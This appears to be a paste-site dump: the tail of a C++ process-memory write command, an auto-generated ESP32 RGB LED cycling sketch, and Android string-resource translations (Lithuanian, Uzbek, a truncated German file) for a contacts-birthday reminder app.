                        if (byte_val > 0xFF) {
                            spdlog::error(""Byte value out of range: {}"", args[i]);
                            return false;
                        }
                        bytes.push_back(static_cast<uint8_t>(byte_val));
                    } catch (...) {
                        spdlog::error(""Invalid hex byte: {}"", args[i]);
                        return false;
                    }
                }

                spdlog::info(""write: {:#x} = (uint8_t[{}]) [{}]"", addr, bytes.size(),
                    fmt::format(""{:#04x}"", fmt::join(bytes, "" "")));

                if (!compat::write_mem(nlp->proc.handle, addr, bytes)) {
                    spdlog::error(""WriteProcessMemory({:#x}), failed: {}"", addr, GetLastError());
                    return false;
                }
                spdlog::info(""Write succeeded"");
                return true;
            }

            std::string val = args[type_idx + 1];
            if (args.size() > type_idx + 2) {
                val.clear();
                for (size_t i = type_idx + 1; i < args.size(); ++i) {
                    if (i > type_idx + 1) val += "" "";
                    val += args[i];
                }
            }

            mem::ValueVariant value;
            try {
                value = mem::parse_argument(val, type);
            } catch (const std::exception& e) {
                spdlog::error(""Error parsing value: {}"", e.what());
                return false;
            }

            std::visit([&](const auto& tp) {
                if constexpr (std::is_same_v<std::decay_t<decltype(tp)>, std::string>) {
                    spdlog::info(""write: {:#014x} = (std::string) \""{}\"""", addr, tp);
                } else if constexpr (std::is_integral_v<std::decay_t<decltype(tp)>>) {
                    spdlog::info(""write: {:#014x} = ({}) {:#x}"", addr, type, tp);
                } else {
                    spdlog::info(""write: {:#014x} = ({}) {}"", addr, type, tp);
                }
            }, value);

            if (!mem::write_value(nlp->proc.handle, value, addr)) {
                spdlog::error(""Write failed: {}"", GetLastError());
                return false;
            }
            spdlog::info(""Write succeeded"");
            return true;
        });"
79eb3EyQ,RGB Cycling rev_02,pleasedontcode,Arduino,Sunday 6th of July 2025 04:57:06 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: RGB Cycling
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2025-07-06 21:55:46

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* The user requirement should specify the control of */
	/* RGB LEDs connected to pins D4, D13, and D14 on the */
	/* ESP32 DevKit V1, emphasizing digital output */
	/* control and color mixing capabilities. */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <FastLED.h>	//https://github.com/FastLED/FastLED

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void updateOutputs();

/***** DEFINITION OF OUTPUT PINS AND LED OBJECTS *****/
const uint8_t led_LEDRGB_Red_PIN_D4		= 4;
const uint8_t led_LEDRGB_Green_PIN_D13	= 13;
const uint8_t led_LEDRGB_Blue_PIN_D14	= 14;

/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
/***** used to store raw data (0-255 for PWM) *****/
uint8_t led_LEDRGB_Red_rawData		= 0;
uint8_t led_LEDRGB_Green_rawData	= 0;
uint8_t led_LEDRGB_Blue_rawData		= 0;

/***** DEFINITION OF OUTPUT PHYSICAL VARIABLES *****/
/***** used to store data after characteristic curve transformation *****/
float led_LEDRGB_Red_phyData		= 0.0;
float led_LEDRGB_Green_phyData	= 0.0;
float led_LEDRGB_Blue_phyData		= 0.0;

/***** DEFINITION OF PWM LED OBJECTS *****/
CRGB led_Red;
CRGB led_Green;
CRGB led_Blue;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/

void setup(void)
{
	// put your setup code here, to run once:

	pinMode(led_LEDRGB_Red_PIN_D4,	 OUTPUT);
	pinMode(led_LEDRGB_Green_PIN_D13,	 OUTPUT);
	pinMode(led_LEDRGB_Blue_PIN_D14,	 OUTPUT);

	// Initialize FastLED objects for PWM control
	led_Red = CRGB::Red;
	led_Green = CRGB::Green;
	led_Blue = CRGB::Blue;
}

void updateOutputs()
{
	// Map raw data (0-255) to PWM duty cycle
	uint8_t redPWM = led_LEDRGB_Red_rawData;
	uint8_t greenPWM = led_LEDRGB_Green_rawData;
	uint8_t bluePWM = led_LEDRGB_Blue_rawData;

	// Write PWM values to pins
	analogWrite(led_LEDRGB_Red_PIN_D4, redPWM);
	analogWrite(led_LEDRGB_Green_PIN_D13, greenPWM);
	analogWrite(led_LEDRGB_Blue_PIN_D14, bluePWM);
}

void loop(void)
{
	// put your main code here, to run repeatedly:

	updateOutputs(); // Refresh output data

	// Example: Cycle colors smoothly (optional)
	// For demonstration, gradually change rawData values
	static uint8_t hue = 0;
	hue++;
	led_LEDRGB_Red_rawData = sin8(hue) / 2 + 127;   // 0-255
	led_LEDRGB_Green_rawData = sin8(hue + 85) / 2 + 127; // Offset hue for variation
	led_LEDRGB_Blue_rawData = sin8(hue + 170) / 2 + 127;

	delay(20);
}

/* END CODE */"
6wDNyhGJ,Lietuviškas,XJIOP,XML,Sunday 6th of July 2025 04:38:54 PM CDT,"<resources>
    <string name=""app_name"">Kontaktų gimtadieniai</string>
    <string name=""contacts_events"">Kontaktiniai įvykiai</string>
    <string name=""settings"">Nustatymai</string>
    <string name=""enable"">Įjungti</string>
    <string name=""reminders"">Priminimai</string>
    <string name=""time_to_remind"">Priminimo laikas</string>
    <string name=""sound_notifications"">Pranešimo garsas</string>
    <string name=""in"">Per</string>
    <string name=""birthday"">Gimtadienis</string>
    <string name=""anniversary"">Sukaktis</string>
    <string name=""event"">Įvykis</string>
    <string name=""today"">Šiandien</string>
    <string name=""tomorrow"">Rytoj</string>
    <string name=""without_sound"">Be garso</string>
    <string name=""dark_theme"">Tamsi tema</string>
    <string name=""about_app"">Apie programą</string>
    <string name=""version"">Versija</string>
    <string name=""cat_main"">PAGRINDINĖ</string>
    <string name=""cat_notification"">PRANEŠIMAI</string>
    <string name=""cat_widget"">WIDGET</string>
    <string name=""cat_app"">PRIEDAS</string>
    <string name=""on_day_of_event"">Įvykio dieną</string>
    <string name=""_1_day_before"">Per 1 dienai</string>
    <string name=""_2_day_before"">Per 2 dienas</string>
    <string name=""_3_day_before"">Per 3 dienas</string>
    <string name=""_7_day_before"">Per 7 dienas</string>
    <string name=""_14_day_before"">Per 14 dienų</string>
    <string name=""_30_day_before"">Per 30 dienų</string>
    <string name=""select_days"">Pasirinkite dienas</string>
    <string name=""language"">Kalba</string>
    <string name=""name_not_specified"">Vardas nenurodytas</string>
    <string name=""contacts_app_not_found"">Kontaktų programa nerasta</string>
    <string name=""configuration"">Konfigūracija</string>
    <string name=""save"">Išsaugoti</string>
    <string name=""cancel"">Atšaukti</string>
    <string name=""yes"">Taip</string>
    <string name=""no"">Ne</string>
    <string name=""note"">Užrašas</string>
    <string name=""text_dots"">tekstas …</string>
    <string name=""event_name"">Įvykio pavadinimas …</string>
    <string name=""birthdays"">Gimtadieniai</string>
    <string name=""anniversaries"">Jubiliejai</string>
    <string name=""others"">Kiti</string>
    <string name=""other"">Kita</string>
    <string name=""customs"">Ypatingi</string>
    <string name=""custom"">Ypatingas</string>
    <string name=""events"">Įvykiai</string>
    <string name=""events_editor"">Įvykių redaktorius</string>
    <string name=""include_year"">Nurodykite metus</string>
    <string name=""saved"">Išsaugota</string>
    <string name=""delete"">Ištrinti</string>
    <string name=""deleted"">Ištrinta</string>
    <string name=""add"">Pridėti</string>
    <string name=""added"">Pridėta</string>
    <string name=""cant_open_link"">Nepavyko atidaryti nuorodos</string>
    <string name=""unknown_error"">Nežinoma klaida</string>
    <string name=""app_action_not_found"">Šiam veiksmui nerasta jokių programų</string>
    <string name=""rate_app_text"">Jei jums patiko ši programa, įvertinkite ją.\n\nAčiū už palaikymą!</string>
    <string name=""rate"">Gerai</string>
    <string name=""remind_later"">Priminkite man vėliau</string>
    <string name=""no_thanks"">Ne, ačiū</string>
    <string name=""share"">Dalytis</string>
    <string name=""remind_in"">Priminti po %s</string>
    <string name=""postpone"">Atidėti</string>
    <string name=""select"">Pasirinkite</string>
    <string name=""date"">Data</string>
    <string name=""name"">Vardas</string>
    <string name=""label_name"">Etiketės pavadinimas</string>
    <string name=""ok"">OK</string>
    <string name=""day"">diena</string>
    <string name=""day2"">dienos</string>
    <string name=""days"">dienos</string>
    <string name=""search"">Paieška</string>
    <string name=""feedback"">Atsiliepimai</string>
    <string name=""rounded_corners"">Suapvalinti kampai</string>
    <string name=""off"">Išjungta</string>
    <string name=""minimum"">Minimalus</string>
    <string name=""medium"">Vidutinis</string>
    <string name=""maximum"">Maksimalus</string>
    <string name=""maximum_"">Maksimalus</string>
    <string name=""photo"">Nuotrauka</string>
    <string name=""divider"">Separatorius</string>
    <string name=""transparency"">Skaidrumas</string>
    <string name=""color"">Spalva</string>
    <string name=""text"">Tekstas</string>
    <string name=""background"">Sfondo</string>
    <string name=""contacts"">Kontaktai</string>
    <string name=""current"">Dabartinė</string>
    <string name=""upcoming"">Būsimas</string>
    <string name=""notification_sound_may_not_work"">Pranešimo garsas gali neveikti</string>
    <string name=""no_access_to_notification_sound"">Negalima naudotis pranešimų garsu</string>
    <string name=""error_reading_contacts"">Klaida skaitant kontaktus</string>
    <string name=""attention"">Dėmesio</string>
    <string name=""i_want_to_do_it"">Aš noriu tai padaryti</string>
    <string name=""doze_recommendation"">Rekomenduojama išjungti akumuliatoriaus taupymą šiai programai. Priešingu atveju pranešimai apie įvykį gali neveikti.</string>
    <string name=""close"">Uždaryti</string>
    <string name=""unknown"">Nežinomas</string>
    <string name=""select_account"">Pasirinkite paskyros</string>
    <string name=""accounts_not_found"">Nerasta jokių paskyrų</string>
    <string name=""phone"">Telefonas</string>
    <string name=""simcard"">SIM kortelė</string>
    <string name=""vibration"">Vibracija</string>
    <string name=""widget_update"">Atnaujinti</string>
    <string name=""every_1_hour"">Kas 1 valandą</string>
    <string name=""every_3_hours"">Kas 3 valandas</string>
    <string name=""every_6_hours"">Kas 6 valandas</string>
    <string name=""every_12_hours"">Kas 12 valandų</string>
    <string name=""every_24_hours"">Kas 24 valandas</string>
    <string name=""notification_test"">Pranešimų testas</string>
    <string name=""in_1_minute"">Po 1 minutės</string>
    <string name=""in_3_minutes"">Po 3 minučių</string>
    <string name=""in_5_minutes"">Po 5 minučių</string>
    <string name=""in_10_minutes"">Po 10 minučių</string>
    <string name=""in_15_minutes"">Po 15 minučių</string>
    <string name=""in_30_minutes"">Po 30 minučių</string>
    <string name=""in_60_minutes"">Po 60 minučių</string>
    <string name=""hello"">Sveiki!</string>
    <string name=""notified_after"">Turėtumėte gauti pranešimą</string>
    <string name=""new_contact"">Naujas kontaktas</string>
    <string name=""first_name"">Vardas</string>
    <string name=""last_name"">Pavardė</string>
    <string name=""contact_name_empty_warning"">Kontaktinio asmens vardas negali būti tuščias</string>
    <string name=""account"">Sąskaita</string>
    <string name=""click_action"">Spustelėkite veiksmą</string>
    <string name=""show_contact"">Rodyti kontaktą</string>
    <string name=""open_application"">Atidaryti programą</string>
    <string name=""font_size"">Šrifto dydis</string>
    <string name=""_default"">Numatytasis</string>
    <string name=""small"">Mažas</string>
    <string name=""large"">Grande</string>
    <string name=""event_day"">Įvykio diena</string>
    <string name=""other_days"">Kitos dienos</string>
    <string name=""auto"">Automatinis</string>
    <string name=""notification"">Pranešimas</string>
    <string name=""notification_management"">Tvarkyti pranešimus</string>
    <string name=""adding_to_blacklist"">Aggiunta alla lista nera</string>
    <string name=""adding_to_whitelist"">Aggiunta alla lista bianca</string>
    <string name=""help_translate"">Vertimo pagalba</string>
    <string name=""help_translate_descr"">Norite padėti išversti šią programą į jūsų kalbą? Dėkojame už jūsų palaikymą!</string>
    <string name=""event_filter"">Įvykių filtras</string>
    <string name=""hide_blacklisted_events"">Slėpti įvykius, kai pranešimai išjungti</string>
    <string name=""nothing"">Nieko</string>
    <string name=""not_selected"">Nepasirinkta</string>
    <string name=""translation_help"">Ačiū už pagalbą atliekant vertimą</string>
    <string name=""no_access_to_contact_app"">Nėra prieigos prie kontaktų programos</string>
    <string name=""name_format"">Vardo formatas</string>
    <string name=""first_last_name"">Vardas, Pavardė</string>
    <string name=""last_first_name"">Pavardė, Vardas</string>
    <string name=""close_after_click"">Uždarykite po paspaudimo</string>
    <string name=""privacy_policy"">Privatumo politika</string>
    <string name=""no_contacts_permission"">Nėra leidimo pasiekti kontaktus</string>
    <string name=""include_daily"">Įskaitant kasdien</string>
    <string name=""event_age"">Renginio amžius</string>
    <string name=""change_color"">Keisti spalvą</string>
    <string name=""reset"">Nustatyti iš naujo</string>
    <string name=""show_photos"">Rodyti nuotraukas</string>
    <string name=""sort"">Rūšiuoti</string>
    <string name=""by_date"">Pagal datą</string>
    <string name=""by_name"">Pagal vardą</string>
    <string name=""by_age"">Pagal amžių</string>
    <string name=""invert"">Apversti</string>
    <string name=""auto_alignment"">Automatinis derinimas</string>
    <string name=""indents"">Įtraukos</string>
    <string name=""group_notifications"">Grupės pranešimai</string>
    <string name=""repeat_interval"">Pakartotinis intervalas</string>
    <string name=""auto_repeat"">Automatinis pakartojimas</string>
    <string name=""auto_repeat_descr"">Jei išjungta, pranešimus galima pakartoti tik naudojant mygtuką Atidėti.</string>
    <string name=""complete"">Užbaigti</string>
    <string name=""m_5"">5 minutės</string>
    <string name=""m_10"">10 minutės</string>
    <string name=""m_15"">15 minutės</string>
    <string name=""m_30"">30 minutės</string>
    <string name=""h_1"">1 valandą</string>
    <string name=""h_3"">3 valandos</string>
    <string name=""h_6"">6 valandos</string>
    <string name=""h_12"">12 valandos</string>
    <string name=""yesterday"">Vakar</string>
    <string name=""days_ago"">Prieš %d %s</string>
    <string name=""app_notification_disabled"">Šios programos pranešimai išjungti</string>
    <string name=""open_notification_settings"">Atidarykite pranešimų nustatymus</string>
    <string name=""open_app_system_settings"">Atidarykite programos sistemos nustatymus</string>
    <string name=""not_show_again"">Daugiau nerodyti</string>
    <string name=""troubleshooting"">Trikčių šalinimas</string>
    <string name=""notification_problems"">Pranešimų problemos</string>
    <string name=""doze_info"">Android akumuliatoriaus optimizavimas gali užblokuoti arba atidėti programų pranešimus.</string>
    <string name=""how_to_disable_doze"">Kaip išjungti akumuliatoriaus optimizavimą</string>
    <string name=""open_doze_settings"">Atidarykite akumuliatoriaus optimizavimo nustatymus</string>
    <string name=""all"">Visi</string>
    <string name=""for_30_days"">30 dienų</string>
    <string name=""for_60_days"">60 dienų</string>
    <string name=""for_90_days"">90 dienų</string>
    <string name=""for_180_days"">180 dienų</string>
    <string name=""show_events"">Rodyti įvykius</string>
    <string name=""enable_notification"">Įgalinti pranešimus</string>
    <string name=""disable_notification"">Išjungti pranešimus</string>
    <string name=""blacklist_info"">Juodasis sąrašas (visi pranešimai įjungti pagal numatytuosius nustatymus)</string>
    <string name=""whitelist_info"">Baltasis sąrašas (pagal numatytuosius nustatymus visi pranešimai išjungti)</string>
    <string name=""no_events"">Jokių įvykių</string>
    <string name=""no_contacts"">Nėra kontaktų</string>
    <string name=""event_age_settings"">Įvykio amžiaus nustatymai</string>
    <string name=""type"">Tipas</string>
    <string name=""round"">Apvalus</string>
    <string name=""wide"">Platus</string>
    <string name=""next_to_name"">Šalia vardo</string>
    <string name=""next_to_date"">Šalia pasimatymo</string>
    <string name=""loading"">Įkeliama</string>
    <string name=""normal"">Normalus</string>
    <string name=""apply"">Taikyti</string>
</resources>"
teJwPSs4,Узбекча,XJIOP,XML,Sunday 6th of July 2025 04:37:19 PM CDT,"<resources>
    <string name=""app_name"">Алоқаларнинг туғилган кунлари</string>
    <string name=""contacts_events"">Алоқа ҳодисалар</string>
    <string name=""settings"">Хусусийлаштириш</string>
    <string name=""enable"">Ёқиш</string>
    <string name=""reminders"">Еслатмалар</string>
    <string name=""time_to_remind"">Еслатмалар вақти</string>
    <string name=""sound_notifications"">Билдиришномалар овози</string>
    <string name=""in"">Орқали</string>
    <string name=""birthday"">Туғилган кун</string>
    <string name=""anniversary"">Йиллиги</string>
    <string name=""event"">Ҳодиса</string>
    <string name=""today"">Бугун</string>
    <string name=""tomorrow"">Эртага</string>
    <string name=""without_sound"">Овозсиз</string>
    <string name=""dark_theme"">Қоронғу мавзу</string>
    <string name=""about_app"">Дастур ҳақида</string>
    <string name=""version"">Версияси</string>
    <string name=""cat_main"">АСОСИЙ</string>
    <string name=""cat_notification"">БИЛДИРИШНОМАЛАР</string>
    <string name=""cat_widget"">ВИДЖЕТ</string>
    <string name=""cat_app"">ДАСТУР</string>
    <string name=""on_day_of_event"">Ҳодиса кунида</string>
    <string name=""_1_day_before"">1 кунда</string>
    <string name=""_2_day_before"">2 кунда</string>
    <string name=""_3_day_before"">3 кунда</string>
    <string name=""_7_day_before"">7 кунда</string>
    <string name=""_14_day_before"">14 кунда</string>
    <string name=""_30_day_before"">30 кунда</string>
    <string name=""select_days"">Кунларни танлаш учун</string>
    <string name=""language"">Тил</string>
    <string name=""name_not_specified"">Исми кўрсатилмаган</string>
    <string name=""contacts_app_not_found"">Алоқалар дастур топилмади</string>
    <string name=""configuration"">Конфигурация</string>
    <string name=""save"">Сақлаш</string>
    <string name=""cancel"">Бекор қилиш</string>
    <string name=""yes"">Ҳа</string>
    <string name=""no"">Йўқ</string>
    <string name=""note"">Қайдасан</string>
    <string name=""text_dots"">матн …</string>
    <string name=""event_name"">Ҳодиса исми…</string>
    <string name=""birthdays"">Туғилган кунлар</string>
    <string name=""anniversaries"">Йиллиглар</string>
    <string name=""others"">Бошқалар</string>
    <string name=""other"">Бошқа</string>
    <string name=""customs"">Махсуслар</string>
    <string name=""custom"">Махсус</string>
    <string name=""events"">Ҳодисалар</string>
    <string name=""events_editor"">Ҳодиса муҳаррири</string>
    <string name=""include_year"">Кўрсатмоқ йил</string>
    <string name=""saved"">Сақланди</string>
    <string name=""delete"">Узоқлаштирмоқ</string>
    <string name=""deleted"">Узоқлаштирган</string>
    <string name=""add"">Қўшиш</string>
    <string name=""added"">Қўшилган</string>
    <string name=""cant_open_link"">Ҳаволани очиш мумкин эмас</string>
    <string name=""unknown_error"">Номаълум хато</string>
    <string name=""app_action_not_found"">Илова шунинг учун ҳаракатлари топилмаган</string>
    <string name=""rate_app_text"">Агар ушбу иловани ёққан бўлса, уни баҳоланг.\n\nСизнинг қўллаб-қувватлашни учун раҳмат!</string>
    <string name=""rate"">Яхши</string>
    <string name=""remind_later"">Кейинчалик менга еслатиб</string>
    <string name=""no_thanks"">Йўқ, раҳмат</string>
    <string name=""share"">Баҳам кўрмоқ</string>
    <string name=""remind_in"">%s ичида менга еслатиб</string>
    <string name=""postpone"">Четга қўйинг</string>
    <string name=""select"">Танлаш</string>
    <string name=""date"">Сана</string>
    <string name=""name"">Исми</string>
    <string name=""label_name"">Ярлык исми</string>
    <string name=""ok"">OK</string>
    <string name=""day"">кун</string>
    <string name=""day2"">куни</string>
    <string name=""days"">кунлар</string>
    <string name=""search"">Қидирув</string>
    <string name=""feedback"">Қайта алоқа</string>
    <string name=""rounded_corners"">Юмалоқ бурчаклар</string>
    <string name=""off"">Ўчирилган</string>
    <string name=""minimum"">Энг кам миқдор</string>
    <string name=""medium"">Ўрта</string>
    <string name=""maximum"">Энг кўп миқдор</string>
    <string name=""maximum_"">Энг кўп миқдор</string>
    <string name=""photo"">Фото</string>
    <string name=""divider"">Айирув</string>
    <string name=""transparency"">Тиниқлик</string>
    <string name=""color"">Ранг</string>
    <string name=""text"">Матн</string>
    <string name=""background"">Орқа фон</string>
    <string name=""contacts"">Алоқалар</string>
    <string name=""current"">Жорий</string>
    <string name=""upcoming"">Бўлажак</string>
    <string name=""notification_sound_may_not_work"">Билдиришнома овози ишламаслиги мумкин</string>
    <string name=""no_access_to_notification_sound"">Билдиришнома овозига кириш йўқ</string>
    <string name=""error_reading_contacts"">Контактларни ўқишда хатолик</string>
    <string name=""attention"">Диққат</string>
    <string name=""i_want_to_do_it"">Мен буни истайман</string>
    <string name=""doze_recommendation"">Ушбу дастур учун батареяни тежашни ўчириш тавсия етилади. Акс ҳолда, воқеалар хабарномалари ишламаслиги мумкин.</string>
    <string name=""close"">Ёпиш учун</string>
    <string name=""unknown"">Номаълум</string>
    <string name=""select_account"">Ҳисобларни танлаш</string>
    <string name=""accounts_not_found"">Ҳисоблар топилмади</string>
    <string name=""phone"">Телефон</string>
    <string name=""simcard"">SIM-карта</string>
    <string name=""vibration"">Вибрация</string>
    <string name=""widget_update"">Янгилаш</string>
    <string name=""every_1_hour"">Ҳар 1 соат</string>
    <string name=""every_3_hours"">Ҳар 3 соат</string>
    <string name=""every_6_hours"">Ҳар 6 соат</string>
    <string name=""every_12_hours"">Ҳар 12 соат</string>
    <string name=""every_24_hours"">Ҳар 24 соат</string>
    <string name=""notification_test"">Билдиришномаларни тест</string>
    <string name=""in_1_minute"">1 минутдан кейин</string>
    <string name=""in_3_minutes"">3 минутдан кейин</string>
    <string name=""in_5_minutes"">5 минутдан кейин</string>
    <string name=""in_10_minutes"">10 минутдан кейин</string>
    <string name=""in_15_minutes"">15 минутдан кейин</string>
    <string name=""in_30_minutes"">30 минутдан кейин</string>
    <string name=""in_60_minutes"">60 минутдан кейин</string>
    <string name=""hello"">Салом!</string>
    <string name=""notified_after"">Сизга билдиришномалар олиш керак</string>
    <string name=""new_contact"">Янги алоқа</string>
    <string name=""first_name"">Исми</string>
    <string name=""last_name"">Фамилия</string>
    <string name=""contact_name_empty_warning"">Контакт номи бўш бўлиши мумкин емас</string>
    <string name=""account"">Фойдаланувчи ҳисоби</string>
    <string name=""click_action"">Клик бўйича ҳаракатланиш </string>
    <string name=""show_contact"">Алоқа кўрсатиш</string>
    <string name=""open_application"">Иловани очинг</string>
    <string name=""font_size"">Шрифт ҳажми</string>
    <string name=""_default"">Сукут бўйича</string>
    <string name=""small"">Кичкина</string>
    <string name=""large"">Катта</string>
    <string name=""event_day"">Ҳодиса кун</string>
    <string name=""other_days"">Бошқа кунлар</string>
    <string name=""auto"">Авто</string>
    <string name=""notification"">Билдиришномалар</string>
    <string name=""notification_management"">Билдиришномаларни бошқариш</string>
    <string name=""adding_to_blacklist"">Қора рўйхатга қўшиш</string>
    <string name=""adding_to_whitelist"">Оққушга қўшиб</string>
    <string name=""help_translate"">Таржима ёрдам</string>
    <string name=""help_translate_descr"">Тилингизга ушбу иловани таржима ёрдам истайсизми? Қўллаб-қувватлашингизни қадрлаймиз!</string>
    <string name=""event_filter"">Воқеалар Филтеринаме</string>
    <string name=""hide_blacklisted_events"">Билдиришномалар ўчирилган воқеаларни яшириш</string>
    <string name=""nothing"">Ҳеч нарса</string>
    <string name=""not_selected"">Танланмаган</string>
    <string name=""translation_help"">Сизга таржима учун рахмат</string>
    <string name=""no_access_to_contact_app"">Контактлар иловасига кириш йўқ</string>
    <string name=""name_format"">Исм формати</string>
    <string name=""first_last_name"">Номлаш, фамилияси</string>
    <string name=""last_first_name"">Фамилияси, номлаш</string>
    <string name=""close_after_click"">Босгандан кейин ёпинг</string>
    <string name=""privacy_policy"">Махфийлик сиёсати</string>
    <string name=""no_contacts_permission"">Контактларга кириш учун рухсат йўқ</string>
    <string name=""include_daily"">Шу жумладан кундалик</string>
    <string name=""event_age"">Тадбир йоши</string>
    <string name=""change_color"">Рангни ўзгартириш</string>
    <string name=""reset"">Қайта тиклаш</string>
    <string name=""show_photos"">Расмларни кўрсатиш</string>
    <string name=""sort"">Саралаш</string>
    <string name=""by_date"">Сана бўйича</string>
    <string name=""by_name"">Номи бўйича</string>
    <string name=""by_age"">Йоши бўйича</string>
    <string name=""invert"">Тескари</string>
    <string name=""auto_alignment"">Автоматик текислаш</string>
    <string name=""indents"">Ҳошия</string>
    <string name=""group_notifications"">Гуруҳ хабарномалари</string>
    <string name=""repeat_interval"">Такрорлаш оралиғи</string>
    <string name=""auto_repeat"">Ауторепеат</string>
    <string name=""auto_repeat_descr"">Агар ўчирилган бўлса, билдиришномаларни фақат кейинга қолдириш тугмаси ёрдамида такрорлаш мумкин.</string>
    <string name=""complete"">Тўлиқ</string>
    <string name=""m_5"">5 дақиқа</string>
    <string name=""m_10"">10 дақиқа</string>
    <string name=""m_15"">15 дақиқа</string>
    <string name=""m_30"">30 дақиқа</string>
    <string name=""h_1"">1 соат</string>
    <string name=""h_3"">3 соат</string>
    <string name=""h_6"">6 соат</string>
    <string name=""h_12"">12 соат</string>
    <string name=""yesterday"">Кеча</string>
    <string name=""days_ago"">%d %s олдин</string>
    <string name=""app_notification_disabled"">Ушбу илова учун билдиришномалар ўчирилган</string>
    <string name=""open_notification_settings"">Билдиришнома Созламаларини Очинг</string>
    <string name=""open_app_system_settings"">Илованинг тизим созламаларини очинг</string>
    <string name=""not_show_again"">Енди кўрсатманг</string>
    <string name=""troubleshooting"">Муаммоларни бартараф етиш</string>
    <string name=""notification_problems"">Билдиришномалар билан боғлиқ муаммолар</string>
    <string name=""doze_info"">Android батареясини оптималлаштириш илова билдиришномаларини блоклаши ёки кечиктириши мумкин.</string>
    <string name=""how_to_disable_doze"">Батареяни оптималлаштиришни қандай ўчириш мумкин</string>
    <string name=""open_doze_settings"">Батареяни оптималлаштириш созламаларини очинг</string>
    <string name=""all"">Ҳаммаси</string>
    <string name=""for_30_days"">30 кун ичида</string>
    <string name=""for_60_days"">60 кун ичида</string>
    <string name=""for_90_days"">90 кун ичида</string>
    <string name=""for_180_days"">180 кун ичида</string>
    <string name=""show_events"">Воқеаларни кўрсатиш</string>
    <string name=""enable_notification"">Билдиришномаларни ёқиш</string>
    <string name=""disable_notification"">Билдиришномаларни ўчириш</string>
    <string name=""blacklist_info"">Қора рўйхат (барча билдиришномалар сукут бўйича ёқилган)</string>
    <string name=""whitelist_info"">Оқ рўйхат (барча билдиришномалар сукут бўйича ўчирилган)</string>
    <string name=""no_events"">Воқеалар йўқ</string>
    <string name=""no_contacts"">Контактлар йўқ</string>
    <string name=""event_age_settings"">Воқеалар Yoshi Созламалари</string>
    <string name=""type"">Тури</string>
    <string name=""round"">Думалоқ</string>
    <string name=""wide"">Кенг</string>
    <string name=""next_to_name"">Исм ёнида</string>
    <string name=""next_to_date"">Сана ёнида</string>
    <string name=""loading"">Юкланмоқда</string>
    <string name=""normal"">Normal</string>
    <string name=""apply"">Қўллаш</string>
</resources>"
Hgf3sbvS,Deutsch,XJIOP,XML,Sunday 6th of July 2025 04:36:19 PM CDT,"<resources>
    <string name=""app_name"">Geburtstage der Kontakte</string>
    <string name=""contacts_events"">Ereignisse der Kontakte</string>
    <string name=""settings"">Einstellungen</string>
    <string name=""enable"">Aktivieren</string>
    <string name=""reminders"">Erinnerungen</string>
    <string name=""time_to_remind"">Zeit zu erinnern</string>
    <string name=""sound_notifications"">Tonbenachrichtigungen</string>
    <string name=""in"">In</string>
    <string name=""birthday"">Geburtstag</string>
    <string name=""anniversary"">Jahrestag</string>
    <string name=""event"">Ereignis</string>
    <string name=""today"">Heute</string>
    <string name=""tomorrow"">Morgen</string>
    <string name=""without_sound"">Ohne Ton</string>
    <string name=""dark_theme"">Dunkles Thema</string>
    <string name=""about_app"">Über die Application</string>
    <string name=""version"">Version</string>
    <string name=""cat_main"">HAUPTTHEMEN</string>
    <string name=""cat_notification"">BENACHRICHTIGUNGEN</string>
    <string name=""cat_widget"">WIDGET</string>
    <string name=""cat_app"">ANWENDUNG</string>
    <string name=""on_day_of_event"">Am Ereignistag</string>
    <string name=""_1_day_before"">Vor 1 Tag</string>
    <string name=""_2_day_before"">Vor 2 Tage</string>
    <string name=""_3_day_before"">Vor 3 Tage</string>
    <string name=""_7_day_before"">Vor 7 Tage</string>
    <string name=""_14_day_before"">Vor 14 Tage</string>
    <string name=""_30_day_before"">Vor 30 Tage</string>
    <string name=""select_days"">Tage auswählen</string>
    <string name=""language"">Sprache</string>
    <string name=""name_not_specified"">Name nicht angegeben</string>
    <string name=""contacts_app_not_found"">Kontakte App nicht gefunden</string>
    <string name=""configuration"">Konfiguration</string>
    <string name=""save"">Speichern</string>
    <string name=""cancel"">Abbrechen</string>
    <string name=""yes"">Ja</string>
    <string name=""no"">Nein</string>
    <string name=""note"">Notiz</string>
    <string name=""text_dots"">text …</string>
    <string name=""event_name"">Ereignisnamen …</string>
    <string name=""birthdays"">Geburtstage</string>
    <string name=""anniversaries"">Jahrestage</string>
    <string name=""others"">Sonstiges</string>
    <string name=""other"">Sonstige</string>
    <string name=""customs"">Besonderes</string>
    <string name=""custom"">Besondere</string>
    <string name=""events"">Ereignisse</string>
    <string name=""events_editor"">Ereignisse Bearbeiten</string>
    <string name=""include_year"">Jahr angeben</string>
    <string name=""saved"">Gespeichert</string>
    <string name=""delete"">Löschen</string>
    <string name=""deleted"">Gelöscht</string>
    <string name=""add"">Hinzufügen</string>
    <string name=""added"">Hinzugefügt</string>
    <string name=""cant_open_link"">Link kann nicht geöffnet werden</string>
    <string name=""unknown_error"">Unbekannter Fehler</string>
    <string name=""app_action_not_found"">App für diese Aktion nicht gefunden</string>
    <string name=""rate_app_text"">Wenn dir diese App gefällt, bewerte sie bitte.\n\nDanke für deine Unterstützung!</string>
    <string name=""rate"">Bewertung</string>
    <string name=""remind_later"">Später erinnern</string>
    <string name=""no_thanks"">Nein, Danke</string>
    <string name=""share"">Teilen</string>
    <string name=""remind_in"">Erinnern in %s</string>
    <string name=""postpone"">Verschieben</string>
    <string name=""select"">Wählen</string>
    <string name=""date"">Datum</string>
    <string name=""name"">Name</string>
    <string name=""label_name"">Name des Labels</string>
    <string name=""ok"">OK</string>
    <string name=""day"">Tag</string>
    <string name=""day2"">Tag</string>
    <string name=""days"">Tagen</string>
    <string name=""search"">Suche</string>
    <string name=""feedback"">Rückmeldung</string>
    <string name=""rounded_corners"">Abgerundete Ecken</string>
